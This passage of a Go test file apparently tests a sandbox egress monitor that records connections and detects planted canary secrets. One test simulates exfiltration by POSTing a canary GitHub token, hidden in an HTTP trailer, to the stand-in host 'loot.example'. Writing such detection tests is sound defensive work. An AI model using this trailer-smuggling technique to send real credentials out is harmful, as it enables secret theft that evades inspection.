			if len(obs) != 1 {
				t.Fatalf("http observations = %+v", obs)
			}
			if d, _ := obs[0].(HTTPDetail); d.Allowed {
				t.Errorf("%s recorded allowed: %+v", hostport, d)
			}
			if w.Body.String() != fakeBody || len(up.got) != 0 {
				t.Errorf("answer %q, upstream got %q; want the fake and nothing sent", w.Body.String(), up.got)
			}
		})
	}
}

func TestPastTheBoundDirectTrafficIsStillSearchedAndCanariesRecorded(t *testing.T) {
	rec := newRecorded()
	e := New(Config{})
	e.Observe(rec.observe)
	junk := ConnectDetail{Address: "203.0.113.9", Port: 9, Proto: "udp", Via: "direct", Refused: true}
	for range maxDirect + 50 {
		e.recordDirect(junk)
	}
	loot := junk
	loot.Canaries = []findings.Match{{Canary: canary.GitHubToken, Encoding: findings.Plain}}
	for range maxDirectCanaries + 5 {
		e.recordDirect(loot)
	}
	obs := rec.of(KindConnect)
	if len(obs) != maxDirect+maxDirectCanaries {
		t.Fatalf("%d direct observations, want %d junk then %d with a canary", len(obs), maxDirect, maxDirectCanaries)
	}
	if d, _ := obs[maxDirect].(ConnectDetail); len(d.Canaries) != 1 {
		t.Errorf("the first after the bound = %+v, want the one with the canary", d)
	}
}

func TestDroppedPacketsAreRecordedUpToTheirBound(t *testing.T) {
	rec := newRecorded()
	e := New(Config{})
	e.Observe(rec.observe)
	for range maxDropped + 3 {
		e.recordDropped(ConnectDetail{}, 1)
	}
	obs := rec.of(KindConnect)
	if len(obs) != maxDropped {
		t.Fatalf("%d dropped observations, want %d", len(obs), maxDropped)
	}
	if d, _ := obs[0].(ConnectDetail); d.Via != "direct" || !d.Refused || d.Dropped != 1 {
		t.Errorf("dropped = %+v", d)
	}
}

func TestACanaryInAnHTTPTrailerIsFound(t *testing.T) {
	ca := newCA(t)
	rec := newRecorded()
	e := New(Config{CA: ca, Upstream: &fakeUpstream{}})
	e.Observe(rec.observe)
	e.SetCanaries(testCanaries)
	proxy := httptest.NewServer(e.Proxy())
	t.Cleanup(proxy.Close)
	// A body of unknown length is sent chunked, with the trailer after it.
	body := io.MultiReader(strings.NewReader("hello"))
	req, err := http.NewRequestWithContext(t.Context(), http.MethodPost, "http://loot.example/up", body)
	if err != nil {
		t.Fatal(err)
	}
	req.Trailer = http.Header{"X-K": {testCanaries.Get(canary.GitHubToken)}}
	resp, err := proxyClient(proxy.URL, ca).Do(req)
	if err != nil {
		t.Fatal(err)
	}
	_, _ = io.Copy(io.Discard, resp.Body)
	_ = resp.Body.Close()
	obs := rec.of(KindHTTP)
	if len(obs) != 1 {
		t.Fatalf("http observations = %+v", obs)
	}
	if d, _ := obs[0].(HTTPDetail); !slices.Contains(d.Canaries, findings.Match{Canary: canary.GitHubToken, Encoding: findings.Plain}) {
		t.Errorf("canaries = %+v, want the token in the trailer", d.Canaries)
	}
}
